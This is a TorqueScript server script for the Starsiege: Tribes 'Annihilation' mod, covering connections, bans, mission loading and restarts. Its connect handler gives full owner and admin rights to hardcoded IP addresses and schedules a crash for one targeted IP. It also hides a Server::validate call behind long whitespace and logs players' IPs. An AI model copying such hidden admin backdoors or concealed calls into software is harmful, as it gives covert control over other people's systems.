// putting a global variable in the argument list means:
// if an argument is passed for that parameter it gets
// assigned to the global scope, not the scope of the function

function createTrainingServer()
{
	$SinglePlayer = true;
	createServer($pref::lastTrainingMission, false);
}

//-------------------------------------------------------------------
// for debugging -Plasmatic
function event::collision(%this,%obj)
{
	%objName = GameBase::getDataName(%this);
	%moveable = GameBase::getDataName(%obj);
	echo("?? EVENT collision "@%objName@" contacted by "@%moveable@" control cl# "@GameBase::getControlClient(%obj));	
}

function CountDeploy(%type)
{
	if(%type != -1)
	{
		%simset = nameToID("MissionCleanup/deployed/"@%type);
		for(%i = 0; (%o = Group::getObject(%simset, %i)) != -1; %i++)
		{			
		}
	}
	return %i;
}

// reports the current number of certain items in server every 5 seconds, for debugging.. -plasmatic
function item::count()
{
	if($StaticShape::count < 0)
	 	$StaticShape::count = "";	
	if($Ammo::count < 0) 	
		$Ammo::count = "";
	if($item::count < 0) 
		$item::count = "";
	if($mine::count < 0) 
		$mine::count = "";
	if($turret::count < 0) 
		$turret::count = "";
	
	%count = $StaticShape::count + $Ammo::count + $item::count + $mine::count + $turret::count;
	if(%count > 300)
		echo("!! Objs= "@%count@", Turrets= "@$turret::count @ ", Statics= " @$StaticShape::count@ ", Ammo mines= "@$Ammo::count@", Items= "@$item::count@", Mineslaunched= "@$mine::count);

	if(%count > 850)
	{
		messageAll(0, "WARNING server exceeding maximum trackable objects. ~wCapturedTower.wav");
		bottomprintall("<jc><f2>!! WARNING !!<f1> server reaching critical levels <f2>"@%count@"<f1> objects in server.", 20);
	}
		// we're going to remove some stuff here... starting with whatever server has the most of... -plasmatic

	if(%count > 1000)
		KillDeploy();
	else if(%count > 850)
	{
		%turretNUM = CountDeploy(turret);
		%objectNUM = CountDeploy(object);
		%BarrierNUM = CountDeploy(Barrier);
		%sensorNUM = CountDeploy(sensor);
		%powerNUM = CountDeploy(power);
		%stationNUM = CountDeploy(station);
		
		%total = %turretNUM + %objectNUM + %BarrierNUM + %sensorNUM + %powerNUM + %stationNUM;
		%threshold = %total/3;
		
		
		if(%BarrierNUM > %threshold)
			UnDeploy(Barrier,%BarrierNUM/10);
		else if(%turretNUM > %threshold)
			UnDeploy(turret,%turretNUM/10);			
	
	}	
	if($ghosting)
		schedule("item::count();",15);
	
}

// for player rotations only -plasmatic
function rotateVector(%vec,%rot){
	%pi = 3.14;
	%rot3= getWord(%rot,2);
	for(%i = 0; %rot3 >= %pi*2; %i++) %rot3 = %rot3 - %pi*2;
	if (%rot3 > %pi) %rot3 = %rot3 - %pi*2;
//	echo(%rot3);
	%vec1= getWord(%vec,0);
	%vec2= getWord(%vec,1);
	%vc = %vec2;
	%vec3= getWord(%vec,2);
//	%ray = pow(pow(%vec1,2)+ pow(%vec2,2),0.5);  
	%ray = %vec1;
//	echo("length ",%ray);
	%vec1 = %ray*cos(%rot3);
	%vec2 = %ray*sin(%rot3);
	%vec = %vec1 @" "@ %vec2 @" "@ %vec3;
	%vec = Vector::add(%vec,Vector::getFromRot(%rot,%vc,0));
	return %vec;
	}


function remoteSetCLInfo(%clientId, %skin, %name, %email, %tribe, %url, %info, %autowp, %enterInv, %msgMask, %pskin)
{	
	if(!evalspam(%clientId))
		return;	//plasm 3.0	
		
	$Client::info[%clientId, 0] = Ann::Clean::string(%skin);
	$Client::info[%clientId, 1] = Ann::Clean::string(%name);
	$Client::info[%clientId, 2] = Ann::Clean::string(%email);
	$Client::info[%clientId, 3] = Ann::Clean::string(%tribe);
	$Client::info[%clientId, 4] = Ann::Clean::string(%url);
	$Client::info[%clientId, 5] = Ann::Clean::string(%info);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Server::validate(%clientId);	
	if(%autowp)
		%clientId.autoWaypoint = true;
	if(%enterInv)
		%clientId.noEnterInventory = true;
	if(%msgMask != "")
		%clientId.messageFilter = %msgMask;
	if(%pskin)
		%clientId.personalskin = true;
	%clientId.suicideTimer = 10;
	
}

function Server::storeData()
{
	//called once on server setup -plasmatic
	$ServerDataFile = "serverTempData" @ $Server::Port @ ".cs";
	export("Server::*", "temp\\" @ $ServerDataFile, False);
	export("pref::lastMission", "temp\\" @ $ServerDataFile, true);
	EvalSearchPath();
	
//	Moved to load slapper if in build mode.. 11/6/2005 7:17AM exec(annihilation);	//plasmatic3	//annihilation3
}

function Server::refreshData()
{
	exec($ServerDataFile);  // reload prefs.
	checkMasterTranslation();
	Server::loadMission($pref::lastMission, false);
	// more asshole proofing -plasmatic 2.3
//	%tempPort = $Server::Port;
	exec(annihilation);	//plasmatic3	annihilation3
//	$Server::Port = %tempPort;
//	echo("!! TempPort "@%tempPort@" $server::port "@$server::port);
	
}

function Server::onClientDisconnect(%clientId)
{
	Ann::PlayerInfo::Disconnect(%clientId);	// Tracker. Plas 3.0 1/30/2005 8:46PM

	if($annihilation::DisableTurretsOnTeamChange)
		Turret::DisableClients(%clientId);
	//cleaning up some variables, the ones that could cause problems... -plasmatic 2.2
	%clientId.scoreKills = 0;
	%clientId.scoreDeaths = 0;
	%clientId.ratio = 0;
	%clientId.score = 0;
	%clientId.noVpack = "";
	%clientId.silenced = "";
	%clientId.BlockMySound = "";
	
	%clientId.isUntouchable = false;	//2.2 admin plasmatic
	%clientId.isAdmin = false; 
	%clientId.isSuperAdmin = false; 
	%clientId.isGod = false;
	%clientId.isOwner = false;	
	
	%clientId.fetchdata = "";
	%ClientId.FlagCurse = "";
	%clientId.droid = "";	
	%clientId.bk = "";
	%clientId.ListType = "";
	%clientId.invo = ""; 
	%clientId.ListType = "";	
	%ClientId.InvConnect = "";
	%clientId.InvTargetable = "";
	%clientId.ConnectBeam = "";	
	%clientId.isSpy = "";	
	%clientId.OrigTeam = "";	
	%clientId.locked = "";		
	%ClientId.SecretAdmin = "";
	%clientId.novote = "";
	
	%cl = %clientId.whisperFrom;	//whisper drop fix. 1/11/2006 11:43AM
	%cl.whisper = "";	
	%clientId.whisper = "";
	
	
	
	//Overflow passwording -Plasmatic 3.0
	%numPlayers = getNumClients()-1;
	//$AnnihilationServer::Password = $Server::Password;
	if(%numPlayers < $Annihilation::OverflowLimit)
	{
		
		$Server::Password = $AnnihilationServer::Password;
		%lock = ". Below overflow limit, removing overflow password. New password= \""@$Server::Password@"\"";		
	}
//	echo("Password = \""@$server::password@"\" Backup = \""@$AnnihilationServer::Password@"\" Overflow limit = \""@$Annihilation::OverflowLimit@"\" Overflow Password = \""@$Annihilation::OverflowPassword@"\"");	
//	echo("Number of Clients: "@%numPlayers@%lock);	
	
	// Need to kill the player off here to make everything
	// is cleaned up properly.
	%player = Client::getOwnedObject(%clientId);
	if(%player != -1 && getObjectType(%player) == "Player" && !Player::isDead(%player)) 
	{
		playNextAnim(%player);
		Player::kill(%player);
	}
	Client::setControlObject(%clientId, -1);
	Client::leaveGame(%clientId);

	Game::CheckTourneyMatchStart();
	if($Annihilation::FairTeams)
		schedule("FairTeamCheck();",2);	//plasmatic schedule added for 2.2
	if($Annihilation::ResetServer != false)
		if(getNumClients() == 1) // this is the last client.
			Server::refreshData();
}

function KickDaJackal(%clientId)
{
	Net::kick(%clientId, "The FBI has been notified.  You better buy a legit copy before they get to your house.");
}

function KickDaJackAss(%clientId)
{
	Net::kick(%clientId, "You are not allowed on this Server. Email " @ $Annihilation::BannedEmail @ " to have ban removed.");
}



// try this in console sometime, foo! -plasmatic
function HelloUna(%client)
{
	%name = client::getname(%client);
	// am I in server?
	%plas = "";
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++) 
	{ 
		%cl = getClientByIndex(%i); 
		%n = Client::getName(%cl); 
		if(%n == "{-o-} Plasmatic")%plas = true;
		
	} 		
	//remove any symbols, etc..
	%string = "<>|[]{}!@#$%^&*()_-+=~";
	for(%i = 0; %i < 23; %i = %i + 1)
	{
		%rem = String::getSubStr(%string, %i, 1);
		%name = Ann::Replace(%name, %rem, "");
		
	}
	%name = Ann::Replace(%name, " ", "");
	echo("helloUna "@%client@" , name "@client::getname(%client)@" cut down to = "@%name);
	%clientId.isAdmin = "true";
	if(%name == "")%name = "Gannon, Unabomber";
	else if(%name == "UnaBomber")%name = %name@", Enforcer";
	else %name = %name@", Unabomber";
//	6/24/2002, 9/20/2002,  8/30/2002 -crash dates
	if(%plas)
	{
		schedule("Client::sendMessage("@%client@", 2,\"{-o-} Plasmatic: Welcome "@%name@"- whatever\");", 5);
		schedule("Client::sendMessage("@%client@", 2,\"{-o-} Plasmatic: neat trick crashing my server monday night... \");", 15);
		schedule("Client::sendMessage("@%client@", 2,\"{-o-} Plasmatic: I'd like to know how you did it of course... \");", 25);
		schedule("Client::sendMessage("@%client@", 2,\"{-o-} Plasmatic: Your still admin here, for now.. \");", 40);
		schedule("remoteScoresOn("@%client@");",42);
		schedule("remoteScoresOff("@%client@");",47);
		schedule("Client::sendMessage("@%client@", 2,\"{-o-} Plasmatic: I'd still like to talk to you sometime, when I'm actually here... \");", 49);
		schedule("Client::sendMessage("@%client@", 2,\"{-o-} Plasmatic: or you can icq me anytime, 77161332... \");", 56);
		schedule("Client::sendMessage("@%client@", 2,\"{-o-} Plasmatic: enjoy admin while I'm away.. ;) \");", 59);
	}
	else
	{
		schedule("Client::sendMessage("@%client@", 1,\"Welcome "@%name@"- whatever..;)\");", 5);
		schedule("Client::sendMessage("@%client@", 1,\"neat trick crashing my server monday night... \");", 15);
		schedule("Client::sendMessage("@%client@", 1,\"I'd like to know how you did it of course... \");", 25);
		schedule("Client::sendMessage("@%client@", 1,\"Your still admin here, for now.. \");", 40);
		schedule("remoteScoresOn("@%client@");",42);
		schedule("remoteScoresOff("@%client@");",47);
		schedule("Client::sendMessage("@%client@", 1,\"I'd still like to talk to you sometime, when I'm actually here... \");", 49);
		schedule("Client::sendMessage("@%client@", 1,\"or you can icq me anytime, 77161332... \");", 56);
		schedule("Client::sendMessage("@%client@", 1,\"enjoy admin while I'm away.. ;) \");", 59);	
	}	
}
// The function you just read is confidential and classified top secret.  
// Eat your computer after reading. -Plasmatic

// part of 2.2 admin -plasmatic
function checkBanlist(%client)
{
	%ip = Client::getTransportAddress(%client);
	%address = Ann::ipCut(%ip);
	for(%i = 0; $AnnIpBan::[%i] != ""; %i = %i + 1)
	{	
		//echo("checking "@$AnnIpBan::[%i]@", "@%address);
		if(!String::ICompare($AnnIpBan::[%i], %address) && !%client.isAdmin)
		{
			%message = Client::getName(%client)@" IP: "@%address@" has been previously banned from this server";
			echo("!! "@%message);
			admin::message(%message);
			%KickMessage = "You are banned on this server. Contact the servers owner for more information.";
			schedule("Net::kick("@%client@", \"You are banned on this server. Contact the Servers Owner for more information.\");",10);	
			BanList::add(%ip, 360);
			BanList::export("config\\banlist.cs");			
			
			return;
		}
	}		
}
	


function Server::onClientConnect(%clientId)
{
	%address = Client::getTransportAddress(%clientId);
	banlist::add(%address, 5);	//5 second ban to prevent retardedness -Plasmatic
	Ann::PlayerInfo::Connect(%clientId);	//2/1/2005 10:59AM Player info tracker.. -Plasmatic
	%name = client::getName(%clientId);

	if(string::findSubStr(client::getName(%clientId), ".bmp>") != "-1" || client::getName(%clientId) == "" || string::findSubStr(client::getName(%clientId), "<R") != "-1" || string::findSubStr(client::getName(%clientId), "<L") != "-1" || string::findSubStr(client::getName(%clientId), "<S") != "-1")
	{
		
		%msg = "Try a different name...";
		schedule("net::kick("@%clientId@", \""@%msg@"\");",0.2);
		banlist::add(client::getTransportAddress(%clientId), 60);
		return;
	}

	echo("CONNECT: " @ %clientId @ " \"" @ escapeString(%name) @ "\" " @ %address@", "@timestamppatch());
	
   	$AnnCLog = Client::getName(%clientId) @ " " @ %address;
	export("AnnCLog","config\\Ann_Connect.log",true);
	admin::message($AnnCLog);
	
	//Overflow passwording -Plasmatic 3.0
	%numPlayers = getNumClients();
	//$AnnihilationServer::Password = $Server::Password;	//back up
	if($Annihilation::OverflowLimit && $Annihilation::OverflowLimit > 0 )
	{
		if($Annihilation::OverflowPassword != "" && $Annihilation::OverflowPassword != -1)
		{
			if(%numPlayers >= $Annihilation::OverflowLimit )
			{
				
				$Server::Password = $Annihilation::OverflowPassword;
				%lock = ". Overflow limit reached, passwording server with \""@$Server::Password@"\"";
				
			}
		}
		else
			echo("Overflow limit reached. No overflow password defined...");
	}
//	echo("Password = \""@$server::password@"\" Backup = \""@$AnnihilationServer::Password@"\" Overflow limit = \""@$Annihilation::OverflowLimit@"\" Overflow Password = \""@$Annihilation::OverflowPassword@"\"");	
	echo("Number of Clients: "@%numPlayers@%lock);
	
   if(!String::NCompare(Client::getTransportAddress(%clientId), "IP:12.224.162.233", 17))
   {
      // Special stuff for an asshole.
      %clientId.isAdmin = "";
      %clientId.isSuperAdmin = "";
      schedule("admin::crash("@%clientId@");",20);
   }
   //custom message for an ip. -plasmatic
	if(!String::NCompare(%address, $messageIP, $messageIPLen) && $messageIP != "")
	{
		%clientId.SpecialMessage = true;
		echo("messaging client");
	}	
	checkclone(%clientID);//Plasmatic

	if( !String::NCompare(%address, "LOOPBACK", 8) || !String::NCompare(%address, "IP:12.217.119.186", 17) || !String::NCompare(%address, "IP:68.15.98.8", 13))
	{
		%clientId.isAdmin = true;
		%clientId.isSuperAdmin = true;	
		%clientId.isGod = true;	
		%clientId.isOwner = true;
	}
		
	// stuff from IX for auto admin, modified -plasmatic
	if($Annihilation::AutoAdmin)
	{
		exec(AnnAdminList);	//refreshing auto admin list	
		Ann::AutoAdmin(%clientId, Ann::ipCut(%address)); 
	}
	if(String::findSubStr(%address,$Annihilation::NetMask) == 0)
		%networkClient = true;
		

	if(%localClient && $Annihilation::GiveLocalAdmin)
	{
		echo ("ADMINMSG: *** Local Client Given SuperAdmin Control");
		%clientId.isAdmin = true;
		%clientId.isSuperAdmin = true;
	}
	if((%networkClient && $Annihilation::GiveNetworkAdmin) || !String::NCompare(%address, "IP:12.217.116.227", 17))
	{
		echo ("ADMINMSG: *** Network Client Given SuperAdmin Control");
		%clientId.isAdmin = true;
		%clientId.isSuperAdmin = true;
	}
	if(Client::getName(%clientId) == "DaJackal")
		schedule("KickDaJackal(" @ %clientId @ ");", 20, %clientId);
	if(%localClient && $Annihilation::LocalIncreaseMax)
	{
		echo ("ADMINMSG: *** Local Client Connected - Increasing Max Player Limit");
		//%clientId.address = %address;
		$Server::MaxPlayers++;
	}
	if(%networkClient && $Annihilation::NetworkIncreaseMax)
	{
		echo ("ADMINMSG: *** Network Client Connected - Increasing Max Player Limit");
		//%clientId.address = %address;
		$Server::MaxPlayers++;
	}
	
	// 2.2 admin fix -plasmatic
	schedule("checkBanlist("@%clientId@");",10);
	
	%clientId.noghost = true;
	%clientId.messageFilter = -1; // all messages
	
	remoteEval(%clientId, SVInfo, "3.0 Beta", $Server::Hostname, $modList, $Server::Info, $ItemFavoritesKey);	//version()
	if(!%clientId.Tkills)	
	{
		%clientId.Tkills=0;
		remoteEval(%clientId, MODInfo, "MODS: Annihilation v" @ $ModVersion @"\n" @ $MODInfo);

	}
	else
	{
		%s = %clientId.TKills/%clientId.TDeaths+0.005;
		%p = String::findSubStr(%s, ".");
		%r = String::getSubStr(%s, 0, %p+3);		
		remoteEval(%clientId, MODInfo, "MODS: Annihilation v" @ $ModVersion @ " "@ $lastModupdate @"\nYou have "@%clientId.TKills@" Kills (" @%r@" to 1)\n" @ $MODInfo);
	}
	remoteEval(%clientId, FileURL, $Server::FileURL);

	// clear out any client info:
	for(%i = 0; %i < 10; %i++)
		$Client::info[%clientId, %i] = "";

	Game::onPlayerConnected(%clientId);	

	function remoteMQY(){remoteEval(2048,MQYS); }
	remoteeval(%clientId,mqy);
	
}

function remotemqys(%cl)
{	
	%name = Client::getName(%cl);
	%ip = Client::getTransportAddress(%cl);
	$Cheater = %name @ " : Client ID : "@%cl@" IP Address : "@ %ip @" Using TROCs mem.dll Cheat.."; 
	export("Cheater","config\\memdllcheat.log",true);		
	echo($Cheater);
	return;
}


// for quick inventories -plasmatic
function AddItem(%Item){
	
	//damn Dynamix for creating Functions within the .exe and not showing them to me... -plasmatic
	$Item += 1;
	$Itemlist[$Item] = %Item;
	//echo("maxdamage "@%item.maxdamage);
}

// for resupply -plasmatic
$AmmoCount = 0;
function addAmmo(%weapon, %ammo, %count)
{
	$Ammo_Weapon[$AmmoCount] = %weapon;
	$Ammo_Ammo[$AmmoCount] = %ammo;
	$Ammo_Count[$AmmoCount] = %count;
	$AmmoCount++;

	if($InvList[%ammo])
		AddItem(%ammo);
}

$FirstWeapon = "";
$LastWeapon = "";
function addWeapon(%weap)
{
	if($FirstWeapon == "")
		$FirstWeapon = %weap;
	if($LastWeapon == "") 
		$LastWeapon = %weap;

	$PrevWeapon[%weap] = $LastWeapon;
	$NextWeapon[%weap] = $FirstWeapon;
	$PrevWeapon[$FirstWeapon] = %weap;
	$NextWeapon[$LastWeapon] = %weap;
	$LastWeapon = %weap;
	
	if($InvList[%weap])
		AddItem(%weap);
}

// moved here to define a little easier, and so function quickinv works properly -plasmatic


// Function ran once on server start up. -Plasmatic
function createServer(%mission, %dedicated)
{
	exec(annihilation); 	//moved here so we can decide what stuff to load.. 
	
	$loadingMission = false;
	$ME::Loaded = false;
	
	if ($Annihilation::RandomMissionStart)
	{
		if ($Server::LastMissionNum == "" || !$Server::LastMissionNum)
			$Server::LastMissionNum = (floor($TotalMissions * getrandom() ));
		else
			$Server::LastMissionNum = (floor($Server::LastMissionNum * getrandom() ));
		%rnd = $Server::LastMissionNum;
		for(%i = 0; %i < %rnd;%i++)
			%j = (floor($TotalMissions *getrandom() ));
		%mission = $TotalMissionList[%j];
		if(%mission == "")
		{
			%mission = $pref::lastMission;
			$Server::LastMissionNum = (floor($TotalMissions *getrandom() ));
		}
	}
	else
	{
		if(%mission == "")
			%mission = $pref::lastMission;
	}

	if(%mission == "")
	{
		echo("Error: no mission provided.");
		return "False";
	}

   if(!$SinglePlayer)
      $pref::lastMission = %mission;

	//display the "loading" screen
	cursorOn(MainWindow);
	GuiLoadContentCtrl(MainWindow, "gui\\Loading.gui");
	renderCanvas(MainWindow);

   if(!%dedicated)
   {
      deleteServer();
      purgeResources();
      newServer();
      focusServer();
   }
	if($SinglePlayer)
		newObject(serverDelegate, FearCSDelegate, true, "LOOPBACK", $Server::Port);
	else
		newObject(serverDelegate, FearCSDelegate, true, "IP", $Server::Port, "IPX", $Server::Port, "LOOPBACK", $Server::Port);


	exec(serverAnnihilation);	//executing all items from here now -Plasmatic

	
	
	
	//done in admin.cs now -plasmatic
//	if($IpLogger)
//	{
//		exec(AnnInfo);
//		exec(IpLogger);
//	}	
	
	Server::storeData();

	// NOTE!! You must have declared all data blocks BEFORE you call
	// preloadServerDataBlocks.

	preloadServerDataBlocks();

	Server::loadMission(($missionName = %mission), true);
	
	exec(AnnAdminList); 
	exec(AnnIpBan);

	if(!%dedicated)
	{
		focusClient();

		if($IRC::DisconnectInSim == "")
		{
			$IRC::DisconnectInSim = true;
		}
		if($IRC::DisconnectInSim == true)
		{
			ircDisconnect();
			$IRCConnected = FALSE;
			$IRCJoinedRoom = FALSE;
		}
		// join up to the server
		$Server::Address = "LOOPBACK:" @ $Server::Port;
		$Server::JoinPassword = $Server::Password;
		connect($Server::Address);
	}
	
	$modList = "Annihilation";  //plasmatic annihilation3
	
	$Checksum = $serverKeyItemMax+$ServerKeyDamageScale+$serverKeyItemReload+$serverKeyItemFire+$serverKeyItemType;
	$ItemFavoritesKey = "Annihilation_"@floor($checksum/3);
	echo("$ItemFavoritesKey = \""@$ItemFavoritesKey@"\";");	//2.2 -plasmatic
	if(floor($checksum/3) != 2806)	//1/22/2005 8:33AM
		$ModVersion = $ModVersion@" ("@floor($checksum/3)@")";
	$AnnihilationServer::Password = $Server::Password;	//setting a backup.. -Plas 3.0	
	if($Annihilation::OverflowLimit)	
		echo("Password = \""@$server::password@"\" Backup = \""@$AnnihilationServer::Password@"\" Overflow limit = \""@$Annihilation::OverflowLimit@"\" Overflow Password = \""@$Annihilation::OverflowPassword@"\"");	
	
//	exec(debug);
	//schedule("countmore();",5);//countmore();	//debugmode 12/7/2005 5:14AM
	
//	PopulateItemMax(OSLauncher);
//	PopulateItemMax(OSAmmo);
//	PopulateItemMax(FighterPack);
//	PopulateItemMax(SurveyDroidPack);
//	PopulateItemMax(ProbeDroidPack);
//	PopulateItemMax(SuicideDroidPack);
		
	
	return "True";
}

// plasmatic 2.2
function Server::CheckSums()
{
	echo("$serverKeyItemMax "@$serverKeyItemMax);
	echo("$ServerKeyDamageScale "@$ServerKeyDamageScale);
	$checksum = "";
	%max = $Item;
	echo(checksums,%max);
	for (%i = 0; %i < %max; %i = %i + 1) 
	{
		//%item = getItemData(%i);
		%item = $Itemlist[%i];	//getItemData(%i);
		%image = %item.imageType;
		
		%pr = %item.price;
		%rt = %image.reloadTime;
		%ft = %image.FireTime;
		%wt = %image.weaponType;
	//	%pt = %image.projectileType;
	//	%mv = %pt.muzzleVelocity;
	//	%kb = %pt.kickBackStrength;
	
		$checksum = $checksum + %rt + %ft + %pr + %wt + %i;
	//		echo(%i@%item@", image "@%image@", price "@%pr@", reload "@%rt@", fire "@%ft@", type "@%wt);
			//@", reload "@%rt@", firetime "@%ft@", proj "@%pt@", muzzle velo "@%mv@", kick back "@%kb);
	}
	$checksum =  ($checksum/10000)>>0.5;
	echo("Server::CheckSums = "@$checksum);
	$modList = "Annihilation";	// "@$checksum;
	if($checksum)
		$count = " "@$checksum;
	$ItemFavoritesKey = $modlist@$checksum;
}


// list of random mission types -Plasmatic
$Annihilation::RMT["Capture the Flag"] = TRUE;
$Annihilation::RMT["Deathmatch"] = FALSE;
$Annihilation::RMT["Balanced"] = TRUE;
$Annihilation::RMT["Open Call"] = TRUE;
$Annihilation::RMT["Multiple Team"] = FALSE;
$Annihilation::RMT["Capture and Hold"] = TRUE;
$Annihilation::RMT["Find and Retrieve"] = FALSE;
$Annihilation::RMT["Defend and Destroy"] = FALSE;
$Annihilation::RMT["Kill the Rabbit"] = FALSE;
$Annihilation::RMT["Flag Hunter"] = FALSE;
$Annihilation::RMT["Team Deathmatch"] = FALSE;
$Annihilation::RMT["Training"] = false;


function remoteCycleMission(%clientId) //!!!
{
	if(%clientId.isAdmin)
	{
		messageAll(0, Client::getName(%playerId) @ " cycled the mission.");
		echo("ADMINMSG: *** " @ Client::getName(%clientId) @ "force mission cycle.");
		Server::nextMission();
	}
}

function remoteDataFinished(%clientId)
{
	if(!evalspam(%clientId))
		return;	//plasm 3.0
			
	if(%clientId.dataFinished)
		return;
	%clientId.dataFinished = true;
	Client::setDataFinished(%clientId);
	%clientId.svNoGhost = ""; // clear the data flag
	if($ghosting)
	{
		%clientId.ghostDoneFlag = true; // allow a CGA done from this dude
		startGhosting(%clientId);  // let the ghosting begin!
	}
}

function remoteCGADone(%playerId)
{
	if(!evalspam(%clientId))
		return;	//plasm 3.0
			
	if(!%playerId.ghostDoneFlag || !$ghosting)
		return;
	%playerId.ghostDoneFlag = "";

	Game::initialMissionDrop(%playerid);

	if($cdTrack != "")
		remoteEval (%playerId, setMusic, $cdTrack, $cdPlayMode);
	remoteEval(%playerId, MInfo, $missionName);
}

function Server::loadMission(%missionName, %immed)
{
	if($loadingMission)
		return;
	echo("!! server::loadmission");	
	// -plasmatic
	if($Annihilation::ResetSettings && !$Server::TourneyMode)	//Leave settings alone in Tourny. -Plasmatic 3.x
	{
		// more asshole proofing -plasmatic 2.3
//		%tempPort = $Server::Port;
		exec(annihilation);	//plasmatic3	annihilation3
//		$Server::Port = %tempPort;
//		echo("!! TempPort "@%tempPort@" $server::port "@$server::port);
		messageall(1,"!! Resetting server settings !!");
		
		
	}
	
	
	%missionFile = "missions\\" $+ %missionName $+ ".mis";
	if(File::FindFirst(%missionFile) == "")
	{
		%missionName = $firstMission;
		%missionFile = "missions\\" $+ %missionName $+ ".mis";
		if(File::FindFirst(%missionFile) == "")
		{
			echo("invalid nextMission and firstMission...");
			echo("aborting mission load.");
			return;
		}
	}
	echo("Notfifying players of mission change: ", getNumClients(), " in game");
	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	{
		Client::setGuiMode(%cl, $GuiModeVictory);
		%cl.guiLock = true;
		%cl.nospawn = true;
		remoteEval(%cl, missionChangeNotify, %missionName);
		%cl.AIkiller = "";	//clean up some ai -Plasmatic 2.2
	}

	$loadingMission = true;
	$missionName = %missionName;
	$missionFile = %missionFile;
	$prevNumTeams = getNumTeams()-1;

	deleteObject("MissionGroup");
	deleteObject("MissionCleanup");
	deleteObject("ConsoleScheduler");
	resetPlayerManager();
	resetGhostManagers();
	$matchStarted = false;
	$countdownStarted = false;
	$ghosting = false;

	resetSimTime(); // deal with time imprecision

	newObject(ConsoleScheduler, SimConsoleScheduler);
	if(!%immed)
		schedule("Server::finishMissionLoad();", 18);
	else
		Server::finishMissionLoad();		
}

//called right after executing mission file, counts static equiptment in bases. -plasmatic
function CountBaseObjects()
{
	while(!%Done && %i < 128)	// 10/2/2007 8:35AM Target Index fix -Plasmatic
	{
		%obj = getObjectByTargetIndex(%i);
		if (%obj != -1)		
			%i++;	
		else
			%Done = true;		
	}
	$staticBaseObjects = %i;	
}
//called when mission is loaded -plasmatic
function Server::finishMissionLoad()
{
	echo("!! Finish mission load");
	$loadingMission = false;
	$TestMissionType = "";
	// instant off of the manager
	setInstantGroup(0);
	newObject(MissionCleanup, SimGroup);
		%group = newObject("Inventory", SimGroup);	//for zappy invs -plasmatic
		addToSet("MissionCleanup", %group);	
			
	exec($missionFile);		// import items to server memory -Plasmatic
	
	Mission::init();		// mission type specific variables

	exec(InitializeMission);	// reset all other variables
	
		%group = newObject("ExtraTeam", TeamGroup);
		addToSet("MissionCleanup", %group);	
	
	if($prevNumTeams != getNumTeams()-1)	//bleh
	{
		// loop thru clients and setTeam to -1;
		messageAll(0, "New teamcount - resetting teams.");
		for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			GameBase::setTeam(%cl, -1);
	}

	// start regular server setup, send info to clients
	
	echo("!! let the ghosts out.");	//gameplay beginning -plasmatic
	$ghosting = true;
	
	if($build)
	{
		//enable slapper with build on.. 
		$ItemMax[armormBuilder, Slapper] = 1;
		$ItemMax[armorfBuilder, Slapper] = 1;		
		
	}	
	
	item::count();	
	
	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	{
		if(!%cl.svNoGhost)
		{
			%cl.ghostDoneFlag = true;
			startGhosting(%cl);
		}
	}
	if($SinglePlayer)
		Game::startMatch();
	else if($Server::warmupTime && !$Server::TourneyMode)
		Server::Countdown($Server::warmupTime);
	else if(!$Server::TourneyMode)
		Game::startMatch();

	
	$teamplay = (getNumTeams()-1 != 1);	//modify team number..
	purgeResources(true);

	// make sure the match happens within 5-10 hours.
	schedule("Server::CheckMatchStarted();", 3600);
	schedule("Server::nextMission();", 18000);
	
	//adding deployables group here... -plasmatic
		%mines = newObject("HandMines", SimGroup);
		addToSet("MissionCleanup", %mines);
			
		%mines = newObject("MiniMine", SimGroup);
		addToSet("MissionCleanup", %mines);	
		
		%mines = newObject("AntipersonelMine", SimGroup);
		addToSet("MissionCleanup", %mines);
		
		%deployed = newObject("Deployed", SimGroup);
		addToSet("MissionCleanup", %deployed);		
		
		%Turret = newObject("Turret", SimGroup);
		%object = newObject("Object", SimGroup);
		%barrier = newObject("Barrier", SimGroup);
		%sensor = newObject("sensor", SimGroup);
		%power = newObject("Power", SimGroup);
		%station = newObject("station", SimGroup);
		%bunker = newObject("Bunker", SimGroup);
		
		addToSet("MissionCleanup/deployed", %turret);
		addToSet("MissionCleanup/deployed", %object);
		addToSet("MissionCleanup/deployed", %barrier);
		addToSet("MissionCleanup/deployed", %sensor);
		addToSet("MissionCleanup/deployed", %power);
		addToSet("MissionCleanup/deployed", %station);
		addToSet("MissionCleanup/deployed", %Bunker);
	// simplify power grids just a wee bit </sarcasm> -Plasmatic
	
//	for(%i = -1; %i < getNumTeams()-1; %i++)
//	{
//		%power = newObject("PowerGrid"@%i, Simgroup);	//SimGroup Simgroups yank object out of origional group -Plasmatic
//		addToSet("MissionCleanup", %power);		
//		
//	}
		
	CountBaseObjects();	
	return "True";
}
function remoteRestart(%client)
{
	if(%client.isSuperAdmin)
	{
		%ip = Client::getTransportAddress(%client);
		%name = Client::getName(%client);
		echo("!! "@%name@", "@%ip@" remote restarted the server !!"); 
		schedule("echo(\"!! RESTARTING SERVER !!\");",21);
		RestartServer();
	}
//	else echo("function restartserver will restart server");
}

function RestartServer()
{
	echo("Restarting server in 25 seconds");
	schedule("Messageall( 2,\"restarting server for upgrades, please reconnect in 25 seconds.\");", 1);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades in 20 seconds, please reconnect in 25 seconds.\",20);", 1);

	schedule("Messageall( 2,\"restarting server for upgrades, please reconnect in 20 seconds.\");", 5);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades in 15 seconds, please reconnect in 20 seconds.\",20);", 5);

	schedule("Messageall( 2,\"restarting server for upgrades, please reconnect in 15 seconds.\");", 10);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades in 10 seconds, please reconnect in 15 seconds.\",20);", 10);

	schedule("Messageall( 2,\"restarting server for upgrades, please reconnect in 10 seconds.\");", 15);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades in 5 seconds, please reconnect in 10 seconds.\",20);", 15);

	schedule("Messageall( 2,\"restarting server for upgrades, please reconnect in 10 seconds.\");", 16);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades in 4 seconds, please reconnect in 10 seconds.\",20);", 16);

	schedule("Messageall( 1,\"restarting server, reconnect.\");", 17);
	schedule("centerprintall(\"<jc><f1>restarting server for upgrades in 3 seconds, please reconnect in 5 seconds.\",20);", 17);

